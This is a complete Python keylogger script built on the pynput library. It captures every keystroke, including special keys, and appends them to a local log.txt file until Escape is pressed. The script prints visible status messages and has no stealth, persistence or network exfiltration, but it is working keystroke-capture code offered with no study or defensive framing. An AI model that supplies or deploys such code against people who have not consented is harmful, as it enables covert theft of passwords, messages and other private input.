import os
from pynput import keyboard

# Define the local path for the log file
LOG_FILE = "log.txt"

def write_to_file(key_string):
    """Appends the captured keystrokes to a local text file."""
    with open(LOG_FILE, "a", encoding="utf-8") as file:
        file.write(key_string)

def on_press(key):
    """Callback function triggered when any key is pressed."""
    try:
        # Capture standard alphanumeric characters
        write_to_file(key.char)
    except AttributeError:
        # Handle special function keys cleanly
        if key == keyboard.Key.space:
            write_to_file(" ")
        elif key == keyboard.Key.enter:
            write_to_file("\n")
        elif key == keyboard.Key.tab:
            write_to_file("\t")
        else:
            # Wrap other keys (e.g., Shift, Ctrl) in brackets
            write_to_file(f" [{key.name}] ")

def on_release(key):
    """Callback function to provide an escape hatch during testing."""
    # Pressing the Escape key stops the execution of the program
    if key == keyboard.Key.esc:
        print("\n[!] Exiting and stopping the listener.")
        return False

# Initialize and run the cross-platform input listener loop
print("[*] Keyboard listener actively running. Press 'Esc' to exit...")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
